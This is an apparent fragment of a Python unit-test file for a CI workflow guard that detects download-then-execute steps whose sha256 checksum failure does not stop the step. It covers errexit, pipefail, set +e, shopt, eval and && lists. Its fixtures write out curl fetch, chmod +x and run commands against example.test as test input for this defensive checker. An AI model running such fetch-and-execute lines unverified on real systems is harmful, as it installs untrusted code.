    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    EXEC = "chmod +x /tmp/payload\n"

    def swallowed(self, check):
        return wg.fetch_exec_defect(self.FETCH + check + self.EXEC)

    def test_or_true(self):
        self.assertIsNotNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c - || true\n' % HEX))

    def test_or_a_warning_annotation(self):
        # nvd-cache.yml uses exactly this idiom for a DIFFERENT command; the
        # point is that the guard must read the separator, not the intent.
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" | sha256sum -c - '
            '|| echo "::warning::checksum mismatch"\n' % HEX))

    def test_backgrounded(self):
        self.assertIsNotNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c - &\n' % HEX))

    def test_under_a_negation(self):
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
            "if ! sha256sum -c /tmp/sums; then echo mismatch; fi\n"))

    def test_under_an_if_condition(self):
        # M3: errexit never applies to an `if` CONDITION, so the step sails
        # past a mismatch exactly as it does with `|| true` -- the unsafe
        # mirror of the `if !` form above.
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
            "if sha256sum -c /tmp/sums; then echo ok; fi\n"))

    def test_or_exit_is_a_gate_not_a_swallow(self):
        # L1: `|| exit 1` ends the job, which is what errexit would have done.
        # It is the cheap hardened spelling, so it must not be refused.
        for branch in ("|| exit 1", "|| exit 2", "|| { echo bad; exit 1; }",
                       "|| { echo '::error::mismatch'; exit 1; }", "|| false"):
            self.assertIsNone(self.swallowed(
                'echo "%s  /tmp/payload" | sha256sum -c - %s\n' % (HEX, branch)),
                branch)

    def test_an_if_test_whose_check_is_the_second_pipeline_stage(self):
        # #1697 item 2, and the FIRST one the issue asks for: the `if` sits on
        # the pipeline HEAD (`echo`), so asking the checksum's own stage
        # whether it is a test answers no -- and this is the spelling the
        # guard's own remedy text recommends, so it is the one an author is
        # most likely to wrap.
        self.assertIsNotNone(self.swallowed(
            'if echo "%s  /tmp/payload" | sha256sum -c -; then :; fi\n' % HEX))

    def test_a_negation_on_the_pipeline_head(self):
        self.assertIsNotNone(self.swallowed(
            '! echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX))

    def test_a_while_test_whose_check_is_the_second_pipeline_stage(self):
        self.assertIsNotNone(self.swallowed(
            'while echo "%s  /tmp/payload" | sha256sum -c -; do break; done\n'
            % HEX))

    def test_a_plain_check_still_counts(self):
        self.assertIsNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX))

    def test_a_check_joined_with_and_counts_only_inside_its_list(self):
        # #2334: bash suspends `-e` for a command ahead of `&&`, so a failing
        # check skips the rest of its list and the step carries on -- bash
        # 3.2 and 5.2 run the later `chmod +x` with the check failing, and
        # skip one written inside the list.
        check = 'echo "%s  /tmp/payload" | sha256sum -c -' % HEX
        found = wg.job_defects([("s", self.FETCH + check + " && echo verified\n" + self.EXEC)])
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names /tmp/payload runs ahead of `&&`", found[0][1])
        self.assertEqual([], wg.job_defects([("s", self.FETCH + check + " && " + self.EXEC)]))
        self.assertIn("runs ahead of `&&`", self.swallowed(check + " && echo verified\n"))
        self.assertIsNone(self.swallowed(check + " && "))


class TestACheckInsideAScriptMustStopTheStep(unittest.TestCase):
    """Review I-2 of the #1793 follow-ups: a checksum inside a script handed to
    `sh -c`, to a shell's standard input (a quoted heredoc, and since #2293 a
    here-string) or to `eval` was credited as if the step's own shell ran it.
    A child shell has no `-e` unless it is given one, and exits with its last
    command's status: bash 3.2 and 5.2 run `./tool` with the checksum failing
    after `sh -c 'CHECK; echo ok'` and after `sh -c 'CHECK' || true`. Such a
    checksum now clears a use only where its failure stops the step: it stops
    the script (`-e` holds there, or it is the script's last command, the last
    of its pipeline unless the script's own pipefail holds) and the command
    handing the script over does not swallow that. `eval` runs in the step's
    own shell, so its script keeps the step's `-e` and pipefail -- except
    `-e` where bash suspends it, behind `||`/`&&`, `!` or `if`."""

    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
    CHECK = 'echo "%s  tool" | sha256sum -c -' % HEX

    def job(self, form, check=CHECK):
        return wg.job_defects([("step", self.FETCH + form % check + "\n./tool\n")])

    def assertReported(self, form, why, check=CHECK):
        found = self.job(form, check)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names tool is inside the script", found[0][1])
        self.assertIn(why, found[0][1])

    def test_a_check_the_script_carries_on_past_is_reported(self):
        for form in ("sh -c '%s; echo ok'", "sh <<< '%s; echo ok'",
                     "sh <<'EOF'\n%s\necho ok\nEOF", "sh -c 'set -e; set +e; %s; echo ok'",
                     "eval '%s; echo ok' || exit 1", "bash -o pipefail -c '%s | cat; echo ok'"):
            with self.subTest(form=form):
                self.assertReported(form, "carries on past its failure")
        self.assertReported('sh -c "sh -c \'%s\'; echo ok"', "the step does not stop",
                            self.CHECK.replace('"', '\\"'))

    def test_a_check_piped_into_another_command_in_the_script_is_reported(self):
        # Re-review N-D: unless the script's own pipefail holds, read from
        # its options or a plain `set` as its `-e` is.
        for form in ("sh -c '%s | cat'", "sh -ec '%s | cat; echo ok'",
                     "bash -c 'set -o pipefail; set +o pipefail; %s | cat'"):
            with self.subTest(form=form):
                self.assertReported(form, "piped into a command whose status the pipeline takes")
        with self.subTest(form="an eval in it keeps the script's"):
            self.assertReported("sh -c 'eval \"%s | cat\"'", "piped into a command whose status",
                                self.CHECK.replace('"', '\\"'))

    def test_a_script_whose_failure_the_step_goes_on_past_is_reported(self):
        for form in ("sh -c '%s' || true", "sh <<< '%s' || true",
                     "sh -ec '%s; echo ok' || true", "if sh -c '%s'; then :; fi",
                     "! sh -c '%s'", "eval '%s; echo ok' || true", "eval '%s' || true"):
            with self.subTest(form=form):
                self.assertReported(form, "the step does not stop when that script fails")

    def test_a_check_that_stops_the_script_and_the_step_still_clears(self):
        for form in ("sh -c '%s'", "sh <<< '%s'", "sh <<'EOF'\n%s\nEOF",
                     "sh -ec '%s; echo ok'", "sh -e -c '%s; echo ok'",
                     "bash -euo pipefail -c '%s; echo ok'", "sh <<< 'set -e; %s; echo ok'",
                     "sh -c 'set -o errexit; %s; echo ok'",
                     "bash -e <<'EOF'\n%s\necho ok\nEOF", "eval '%s; echo ok'",
                     "eval '%s' || exit 1", "sh -c '%s' || exit 1",
                     "bash -o pipefail -c '%s | cat'", "bash -eo pipefail -c '%s | cat; echo ok'",
                     "bash -c 'set -o pipefail; %s | cat'", "bash -o errexit -o pipefail "
                     "-c '%s | cat; echo ok'", "sh -c 'set -euo pipefail; %s | cat; echo ok'"):
            with self.subTest(form=form):
                self.assertEqual([], self.job(form))
        self.assertEqual([], self.job('sh -c "sh -c \'%s\'"', self.CHECK.replace('"', '\\"')))

    def test_the_top_level_twins_read_as_before(self):
        # The must-trip controls: the step's own `CHECK || true` is reported
        # on every tree, and its own `CHECK` clears.
        self.assertIn("hands its failure to a `||` branch", self.job("%s || true")[0][1])
        self.assertEqual([], self.job("%s"))

    def test_an_exit_behind_the_check_in_a_script_without_e_is_not_read(self):
        # Fail-closed, and the rule's known over-reports (re-review N-D): bash
        # stops each of these scripts at the failing check -- at `exit 1`, at
        # `exit $?`, and under a `set -e` or `set -o pipefail` written inside
        # a branch -- but only `-e` or pipefail from the script's options or
        # a plain `set`, or its last command, are read as stopping it.
        self.assertReported("sh -c '%s || exit 1; echo ok'", "carries on past its failure")
        self.assertReported("sh -c '%s; exit $?'", "carries on past its failure")
        self.assertReported("sh -c 'if true; then set -e; fi; %s; echo ok'",
                            "carries on past its failure")
        self.assertReported("bash -c 'if true; then set -o pipefail; fi; %s | cat'",
                            "piped into a command whose status the pipeline takes")


class TestASetPlusEAtTheStepsTopLevel(unittest.TestCase):
    """#2335: a `set +e` at the step's top level turns errexit off from there
    on, so a failing check no longer stops the step and bash 3.2 and 5.2 run
    the later use -- but the guard credited the check, reading `-e` as always
    on outside a child script. The step's own statements now carry `-e` the
    way a child script's do (`workflow_forms._errexit_states`): a `set` turns
    it on only as a plain statement outside every branch, group and list, and
    off wherever it is -- `eval`'s too, which runs in the step's own shell.
    Where it is off, a check still stops the step in its last command, or
    through an `||` branch that exits (an `exit` ends the step whatever `-e`
    says; a `false` does not)."""

    FETCH = "curl -fsSLo /tmp/payload https://example.test/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -' % HEX
    USE = "chmod +x /tmp/payload && /tmp/payload\n"

    def job(self, body, shell=None, use=USE):
        return wg.job_defects([wg.Step("step", self.FETCH + body % self.CHECK + use, shell)])

    def test_a_check_after_set_plus_e_is_reported_under_every_shell(self):
        for shell in (None, "sh", "bash"):
            for body in ("set +e\n%s\n", "set +o errexit\n%s\n", "set -e\nset +e\n%s\n",
                         "if true; then set +e; fi\n%s\n", "set +e\n%s || false\n",
                         "eval 'set +e'\n%s\n", "eval set +e\n%s\n"):
                with self.subTest(shell=shell, body=body):
                    found = self.job(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload runs after a `set +e`",
                                  found[0][1])

    def test_a_script_handed_on_after_set_plus_e_is_reported(self):
        # `flattened` credits the script as far as the command running it;
        # that command runs after the `set +e`, so its failure goes nowhere.
        for body in ("set +e\nsh -c '%s'\n", "set +e\neval '%s'\n",
                     "set +e\nbash <<'EOF'\n%s\nEOF\n"):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])

    def test_a_set_plus_e_that_eval_runs_inside_a_script_is_read_there(self):
        found = self.job("sh -ec 'eval \"set +e\"; %s; echo ok'\n")
        self.assertEqual(1, len(found), found)
        self.assertIn("carries on past its failure", found[0][1])

    def test_what_still_stops_the_step_with_errexit_off(self):
        for body in ("set +e\n%s || exit 1\n", 'set +e\n%s || { echo "::error::bad"; exit 1; }\n',
                     "set +e\nset -e\n%s\n", "%s\nset +e\n", "set +e\nsh -c '%s' || exit 1\n",
                     "sh -c 'set +e'\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body))
        # The use inside the list the check heads is skipped when it fails.
        self.assertEqual([], self.job("set +e\n%s && "))
        # As the step's last command its failure is the step's: the job stops.
        self.assertEqual([], wg.job_defects([wg.Step("get", self.FETCH + "set +e\n" + self.CHECK),
                                             wg.Step("run", self.USE)]))

    def test_the_top_level_controls_read_as_before(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("%s\n", shell))
                self.assertIn("hands its failure to a `||` branch",
                              self.job("%s || true\n", shell)[0][1])


class TestAPipedCheckGatesOnlyUnderPipefail(unittest.TestCase):
    """#2338: a pipeline's status is its LAST command's unless `pipefail`
    holds, so a check piped into another command (`CHECK | tee log`) stops
    nothing where it is off -- and GitHub runs a step with no `shell:` as
    `bash -e {0}`, which has none: `shell: bash` adds `-o pipefail`, `shell:
    sh` is `sh -e {0}`, and a template (`bash {0}`) runs with exactly the
    options it writes. The guard read every step as if pipefail held. The
    step's `shell:` now seeds its `-e` and pipefail (`workflow_gating.seed`),
    a top-level `set` moves them, and `read(script)` without a shell reads
    the runner default."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    PIPED = "%s | tee log\n"
    job = TestASetPlusEAtTheStepsTopLevel.job

    def test_a_piped_check_without_pipefail_is_reported(self):
        for shell, body in ((None, self.PIPED), ("sh", self.PIPED),
                            ("bash", "set +o pipefail\n" + self.PIPED), ("bash -e {0}", self.PIPED),
                            ("bash {0}", self.PIPED)):
            with self.subTest(shell=shell, body=body):
                found = self.job(body, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("the checksum that names /tmp/payload is piped into another "
                              "command where this guard reads `pipefail` as off", found[0][1])
                self.assertIn("(`shell: bash` turns pipefail on, and so does a `set -o pipefail` "
                              "before it where the shell is bash)", found[0][1])
        self.assertIn("where this guard reads `pipefail` as off",
                      wg.fetch_exec_defect(self.FETCH + self.PIPED % self.CHECK + self.USE))

    def test_a_piped_check_under_pipefail_still_clears(self):
        for shell, body in (("bash", self.PIPED), (None, "set -o pipefail\n" + self.PIPED),
                            ("bash -eo pipefail {0}", self.PIPED),
                            ("/bin/bash --noprofile --norc -eo pipefail {0}", self.PIPED)):
            with self.subTest(shell=shell, body=body):
                self.assertEqual([], self.job(body, shell))

    def test_the_script_twins_take_the_steps_pipefail(self):
        # The child's own pipefail covers its inner pipe, not the outer one
        # whose status `tee` sets; `eval` runs in the step's shell and so
        # inherits whatever pipefail the step has.
        for form, why in (("bash -c 'set -o pipefail; %s | cat' | tee log\n",
                           "the step does not stop when that script fails"),
                          ("eval '%s | cat'\n", "piped into a command whose status")):
            with self.subTest(form=form):
                found = self.job(form)
                self.assertEqual(1, len(found), found)
                self.assertIn(why, found[0][1])
                self.assertEqual([], self.job(form, "bash"))

    def test_a_template_without_e_gates_nothing_a_rescue_does_not(self):
        found = self.job("%s\n", "bash {0}")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs under `shell: bash {0}`, which this guard reads as starting without "
                      "errexit", found[0][1])
        for body in ("%s || exit 1\n", "set -e\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body, "bash {0}"))
        for shell in ("bash -e {0}", "bash -eo pipefail {0}", "sh -e {0}"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("%s\n", shell))


class TestTheShoptAndBuiltinSpellingsOfSetAreRead(unittest.TestCase):
    """#2335 and #2338 review N-2: bash moves errexit and pipefail through
    `shopt -u -o NAME` (`-uo`), `shopt -s -o NAME` (`-so`) and `builtin set`,
    and the guard read only `set` and `eval set`. After `shopt -uo errexit` or
    `builtin set +e` bash 5.2.21 runs the use past a failing check the guard
    credited; after `shopt -so pipefail` a piped check gates where the guard
    refused it. A `shopt` with `-s` or `-u` and `-o` now reads as the `set -o`
    or `set +o` it spells, and a leading `builtin` as a leading `command`
    does, under the rule `set` has: off wherever it is written, on only as a
    plain statement -- a plain `shopt` only where the step's shell is bash,
    since dash has none (`shopt: not found`, exit 127), and never behind
    `builtin`, which this guard reads, with `command` and `eval`, as able only
    to turn an option off (bash turns it on through them)."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    PIPED = TestAPipedCheckGatesOnlyUnderPipefail.PIPED
    job = TestASetPlusEAtTheStepsTopLevel.job

    def test_every_spelling_turns_errexit_off_wherever_it_is(self):
        for shell in (None, "sh", "bash"):
            for spelling in ("shopt -uo errexit", "shopt -u -o errexit", "shopt -ou errexit",
                             "shopt -uo nounset errexit", "builtin set +e",
                             "builtin set +o errexit", "command builtin set +e",
                             "builtin command set +e", "eval shopt -uo errexit",
                             "if true; then shopt -uo errexit; fi"):
                with self.subTest(shell=shell, spelling=spelling):
                    found = self.job(spelling + "\n%s\n", shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload runs after a `set +e`",
                                  found[0][1])

    def test_every_spelling_turns_pipefail_off(self):
        for spelling in ("shopt -uo pipefail", "shopt -u -o pipefail", "builtin set +o pipefail",
                         "{ shopt -uo pipefail; }"):
            with self.subTest(spelling=spelling):
                found = self.job(spelling + "\n" + self.PIPED, "bash")
                self.assertEqual(1, len(found), found)
                self.assertIn("is piped into another command where this guard reads `pipefail` "
                              "as off", found[0][1])

    def test_a_plain_shopt_turns_them_on_where_the_shell_is_bash(self):
        for shell in (None, "bash", "bash {0}"):
            for spelling in ("shopt -so errexit", "shopt -s -o errexit"):
                with self.subTest(shell=shell, spelling=spelling):
                    self.assertEqual([], self.job("set +e\n" + spelling + "\n%s\n", shell))
        for shell in (None, "bash -e {0}"):
            for spelling in ("shopt -so pipefail", "shopt -s -o pipefail", "shopt -os pipefail"):
                with self.subTest(shell=shell, spelling=spelling):
                    self.assertEqual([], self.job(spelling + "\n" + self.PIPED, shell))
        # dash has no `shopt`: under `shell: sh` it turns nothing on.
        self.assertIn("runs after a `set +e`",
                      self.job("set +e\nshopt -so errexit\n%s\n", "sh")[0][1])
        self.assertIn("where this guard reads `pipefail` as off",
                      self.job("shopt -so pipefail\n" + self.PIPED, "sh")[0][1])

    def test_a_shopt_that_eval_runs_is_read_under_the_steps_shell(self):
        # Review N-6: `eval` runs its text in the step's own shell, so under
        # dash its `shopt` is not found either and the use runs; the text was
        # read as bash's.
        found = self.job("eval 'set +e; shopt -so errexit'\n%s\n", "sh")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs after a `set +e`", found[0][1])
        # The controls: the same words outside `eval`, and `eval` without the
        # `shopt`, reported; `set -e` inside it, and the `shopt` where the
        # shell is bash, cleared.
        for body in ("set +e\nshopt -so errexit\n%s\n", "eval 'set +e'\n%s\n"):
            with self.subTest(body=body):
                self.assertIn("runs after a `set +e`", self.job(body, "sh")[0][1])
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("eval 'set +e; set -e'\n%s\n", shell))
        for shell in (None, "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("eval 'set +e; shopt -so errexit'\n%s\n", shell))

    def test_the_readings_that_stay_fail_closed(self):
        # Bash turns the option on in the first five, which the guard does not
        # read on: behind `builtin`, `command` or `eval`, or inside a branch.
        # The last two turn nothing on: `shopt -o` alone only reports, and
        # `pipefail` is not one of `shopt`'s own options. Each sentence says it
        # is this guard's reading (review N-7).
        off = "where this guard reads `pipefail` as off"
        for body, why in (("set +e\nbuiltin set -e\n%s\n", "runs after a `set +e`"),
                          ("set +e\ncommand shopt -so errexit\n%s\n", "runs after a `set +e`"),
                          ("set +e\neval shopt -so errexit\n%s\n", "runs after a `set +e`"),
                          ("builtin set -o pipefail\n" + self.PIPED, off),
                          ("if true; then shopt -so pipefail; fi\n" + self.PIPED, off),
                          ("shopt -o pipefail\n" + self.PIPED, off),
                          ("shopt -s pipefail\n" + self.PIPED, off)):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn(why, found[0][1])
        self.assertEqual([], self.job("shopt -s extglob\n%s\n"))


class TestACheckAheadOfAndGatesOnlyItsList(unittest.TestCase):
    """#2334: bash suspends `-e` for every command of an `&&`/`||` list but
    the last, so a failing check ahead of `&&` only skips the rest of its
    list and the step carries on: bash 3.2 and 5.2 run a later use with the
    check failing, and skip one written inside the list. The guard credited
    such a check as gating the whole job, and its carrier twins too (`sh -c
    'CHECK' && ...`, `eval 'CHECK' && ...`). It now clears only what the list
    runs -- up to the first `||` or the end of the list, a compound command
    in it taken whole -- unless the list's failure is still the step's: as
    its last command, through an `||` branch that exits, or through the
    group it ends -- a subshell's failure, which `-e` does not let pass, or a
    `{ ...; }` group's as the step's last command or through its own `||`."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    job = TestASetPlusEAtTheStepsTopLevel.job

    def both(self, body, shell=None, use=USE):
        """`job_defects`' reasons, which `fetch_exec_defects` gives too where
        the step has no `shell:`."""
        found = [why for _step, why in self.job(body, shell, use)]
        if shell is None:
            self.assertEqual(found, wg.fetch_exec_defects(self.FETCH + body % self.CHECK + use))
        return found

    def test_a_use_after_the_list_is_reported(self):
        for shell in (None, "bash"):
            for body in ("%s && echo verified\n", "%s && echo ok || echo failed\n",
                         "true && %s && echo ok\n", "%s && echo ok &\n", "{ %s && echo ok; }\n",
                         "if true; then %s && echo ok; fi\n", "set +e\n%s && echo ok\n",
                         "sh -c '%s' && echo ok\n", "eval '%s' && echo ok\n",
                         "{ %s && echo ok; } && echo more\n", "{ %s && echo ok; } || true\n",
                         "( %s && echo ok ) || true\n", "( %s && echo ok ) &\nwait\n"):
                with self.subTest(shell=shell, body=body):
                    found = self.both(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload runs ahead of `&&`, "
                                  "where the shell suspends `-e`", found[0])
        # A subshell piped into `tee` hands its failure to the pipeline, which
        # takes `tee`'s status unless pipefail holds.
        self.assertEqual(1, len(self.both("( %s && echo ok ) | tee log\n")))
        self.assertEqual([], self.job("( %s && echo ok ) | tee log\n", "bash"))

    def test_a_use_the_list_runs_after_an_or_is_reported(self):
        # The list's `||` branch runs BECAUSE the check failed: a use there
        # is the failing path, not a verified one.
        found = self.both("%s && echo ok || sh /tmp/payload\n", use="")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs ahead of `&&`", found[0])

    def test_a_use_inside_the_list_is_cleared(self):
        for body in ("%s && chmod +x /tmp/payload && /tmp/payload\necho done\n",
                     "%s && { chmod +x /tmp/payload; /tmp/payload; }\necho done\n",
                     "%s && if true; then chmod +x /tmp/payload; fi\necho done\n",
                     "true && %s && chmod +x /tmp/payload\necho done\n",
                     "set +e\n%s && chmod +x /tmp/payload\necho done\n",
                     "sh -c '%s' && chmod +x /tmp/payload && /tmp/payload\necho done\n",
                     "eval '%s' && chmod +x /tmp/payload\necho done\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.both(body, use=""))
        self.assertEqual([], self.job("%s && chmod +x /tmp/payload\necho done\n", "bash {0}", ""))

    def test_where_the_lists_failure_still_stops_the_step(self):
        for body in ("true && %s\n", "%s && echo ok || exit 1\n", "( %s && echo ok )\n",
                     "(cd /tmp && %s && echo ok)\n", "eval '%s && echo ok'\n",
                     "( %s && echo ok ) || exit 1\n", "{ %s && echo ok; } || exit 1\n",
                     "{\n  %s && echo ok\n} || exit 1\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.both(body))
        # As the step's last command, the list's status is the step's -- and a
        # `{ ...; }` group's, when the list is that group's last command.
        for body in (" && echo verified\n", " && echo verified; }\n"):
            with self.subTest(body=body):
                self.assertEqual([], wg.job_defects([
                    wg.Step("check", self.FETCH + ("{ " if "}" in body else "") + self.CHECK
                            + body), wg.Step("run", self.USE)]))

    def test_the_lists_own_controls_read_as_before(self):
        # A check piped into `tee` has lost its status before `&&` reads it,
        # one with no digest checks nothing, and a step carrying
        # `continue-on-error: true` lets the job carry on past its failure
        # even where the list ends the step.
        piped = self.job("%s | tee log && chmod +x /tmp/payload\necho done\n", use="")
        self.assertEqual(1, len(piped), piped)
        self.assertIn("where this guard reads `pipefail` as off", piped[0][1])
        bare = wg.job_defects([("s", self.FETCH + 'echo "/tmp/payload" | sha256sum -c - && '
                                "chmod +x /tmp/payload\necho done\n")])
        self.assertEqual(1, len(bare), bare)
        self.assertIn("carries no digest", bare[0][1])
        soft = wg.job_defects([wg.Step("s", self.FETCH + self.CHECK + " && echo verified\n",
                                       None, None, True), wg.Step("u", "sh /tmp/payload\n")])
        self.assertEqual(1, len(soft), soft)
        self.assertIn("continue-on-error", soft[0][1])

    def test_the_batchs_controls_keep_their_verdicts_under_every_shell(self):
        # #2335, #2338 and #2334 read the step's shell; none of them moves a
        # plain check or its exiting rescues (cleared), `|| true`, `!` or an
        # `if` test (refused), a fetch-and-run with no check (reported), or a
        # job that downloads nothing (clean), under any `shell:` a step names.
        for shell in (None, "sh", "bash"):
            for body in ("%s\n", "%s || exit 1\n", '%s || { echo "::error::bad"; exit 1; }\n'):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.job(body, shell))
            for body, why in (("%s || true\n", "hands its failure to a `||` branch"),
                              ("! %s\n", "is negated"),
                              ("if %s; then echo ok; fi\n", "is an `if`/`while` test")):
                with self.subTest(shell=shell, body=body):
                    found = self.job(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload " + why, found[0][1])
            with self.subTest(shell=shell, body="no check"):
                found = wg.job_defects([wg.Step("s", self.FETCH + self.USE, shell)])
                self.assertEqual(1, len(found), found)
                self.assertIn("with nothing verifying what arrived", found[0][1])
            for idiom in ("make\n", "npm ci\n", "sh scripts/build.sh\n"):
                with self.subTest(shell=shell, body=idiom):
                    self.assertEqual([], wg.job_defects([wg.Step("s", idiom, shell)]))


class TestAListWhoseEndTheReaderLostFailsClosed(unittest.TestCase):
    """#2334 review I-1: the guard finds where a check's `&&` list ends by
    counting the compound commands it opens and closes, and the reader breaks
    that count two ways -- it drops a line holding only `(` or `)`, and a
    `case` pattern's `)` inside `$(...)` ends the substitution, so the `esac`
    after it closes a group nothing opened. A count that never balanced read
    as "the list runs to the step's end", and one that closed a subshell no
    statement up to the check opened read as "the list ends its own
    subshell": either way the check was credited for the whole step, where
    bash 5.2.21 and dash skip the subshell and run the use after it. A list
    whose end the count cannot place now clears nothing after the check.
    Review I-3: nor does a list followed by a `)` that no statement up to
    the check opened -- `CHECK && (` ending its line, which the reader drops,
    then `echo b` and `) 2>&1 | tee log` -- which read as a list ending its
    own subshell, whose failure pipefail hands the step. Review I-4: a
    `$(case ...)` is now read by its signature -- the list closes a `case`
    it never opened -- not by the count, which a `(` the reader kept without
    its `)` balanced, and which the `esac` could leave at 0 inside the list.
    Review N-7: such a list is refused in words of its own, since bash does
    stop the step on some of them; `_AHEAD`'s "the step carries on past it"
    stays with the lists whose end the guard reads."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    job = TestASetPlusEAtTheStepsTopLevel.job
    both = TestACheckAheadOfAndGatesOnlyItsList.both

    AHEAD = "runs ahead of `&&`, where the shell suspends `-e`"
    LOST = ("runs ahead of `&&` in a list whose end this guard cannot read (for example a "
            "line ending in `(` or starting with `)`, or a `case` inside `$(...)`), so it "
            "clears nothing after its own command in that list")

    def assertAhead(self, body, shell, why=AHEAD):
        found = self.both(body, shell)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names /tmp/payload " + why, found[0])

    def assertLost(self, body, shell):
        self.assertAhead(body, shell, self.LOST)

    def test_a_lone_paren_line_or_a_case_in_a_substitution_clears_nothing_after(self):
        for shell in (None, "sh", "bash"):
            for body in ("%s && ( echo a\n)\n", "%s && ( echo a\n  echo b\n)\n",
                         "%s && ( cd / && echo a\n)\n", "%s && (\n  echo a )\n",
                         "%s && if true; then echo $(case x in x) echo y | cat;; esac); fi\n",
                         # A `{` before the check opens no subshell for the `)` to close.
                         "{ %s && if true; then echo $(case x in x) echo y;; esac); fi; }\n",
                         "{\n%s && if true; then echo $(case x in x) echo y;; esac); fi\n}\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertLost(body, shell)

    def test_the_spellings_the_count_reads_whole_keep_their_verdicts(self):
        # The subshell on one line, both parens on lines of their own (the
        # reader drops both, leaving the list), the substitution without the
        # `if` and the `if` without the `case`: reported before and after.
        for shell in (None, "sh", "bash"):
            for body in ("%s && ( echo a )\n", "%s && (\n  echo a\n)\n",
                         "%s && echo $(case x in x) echo y | cat;; esac)\n",
                         "%s && if true; then echo $(echo y | cat); fi\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        # A subshell the list does end, opened on the check's line or before
        # it, is the subshell's failure, which `-e` does not let pass.
        for body in ("( %s && echo ok )\n", "(cd /tmp && %s && echo ok)\n",
                     "( echo a; %s && echo ok )\n", "( ( %s && echo ok ) )\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.both(body))

    def test_a_paren_the_reader_dropped_after_and_ends_no_group(self):
        # Under pipefail each read as a list ending its own subshell; bash
        # skips the subshell after `&&` and runs the use.
        for shell, body in (("bash", "%s && (\n  echo b\n) 2>&1 | tee log\n"),
                            ("bash", "%s &&\n(\n  echo b\n) 2>&1 | tee log\n"),
                            ("bash", "%s && (\n  cd / && echo b\n) 2>&1 | tee log\n"),
                            ("bash", "%s && echo ok && (\n  echo b\n) | tee log\n"),
                            (None, "set -o pipefail\n%s && (\n  echo b\n) 2>&1 | tee log\n"),
                            (None, "shopt -so pipefail\n%s && (\n  echo b\n) 2>&1 | tee log\n")):
            with self.subTest(shell=shell, body=body):
                self.assertLost(body, shell)
        # The controls, reported before and after: the subshell on one line,
        # its `(` kept on the next statement, a `{ }` group after `&&`, and
        # the dropped `(` where pipefail is off, now in the lost list's words.
        for shell in (None, "sh", "bash"):
            for body in ("%s && ( echo b ) 2>&1 | tee log\n", "%s && ( echo b\n) 2>&1 | tee log\n",
                         "%s && {\n  echo b\n} 2>&1 | tee log\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        for shell in (None, "sh"):
            with self.subTest(shell=shell):
                self.assertLost("%s && (\n  echo b\n) 2>&1 | tee log\n", shell)
        # The fail-closed price: `(` alone before the check gives the reader
        # the same statements, so it is refused too, though bash stops the step
        # there; a `{`, which the reader keeps, still reads as the group.
        self.assertLost("(\n  %s && echo b\n) 2>&1 | tee log\n", "bash")
        self.assertEqual([], self.job("{\n  %s && echo b\n} 2>&1 | tee log\n", "bash"))

    def test_a_case_closed_inside_a_substitution_fails_closed_whatever_the_count(self):
        # A `(` kept without its `)` -- a multi-line array, a subshell whose
        # `)` stands alone, the subshell holding the check -- vouched for the
        # `)` the `esac` carries; an `esac` inside two `if`s left the count at
        # 0 there, and the list read as ending at its `||` or at the `)` after
        # it. Bash 5.2.21 runs each use, and dash each it can parse.
        sub = "if true; then echo $(case x in x) echo y;; esac); fi"
        every = (None, "sh", "bash")
        for shells, body in (((None, "bash"), "arr=(\n  a\n)\n%s && " + sub + "\n"),
                             (every, "( echo a\n)\n%s && " + sub + "\n"),
                             (every, "( echo a; %s && " + sub + "; echo more )\n"),
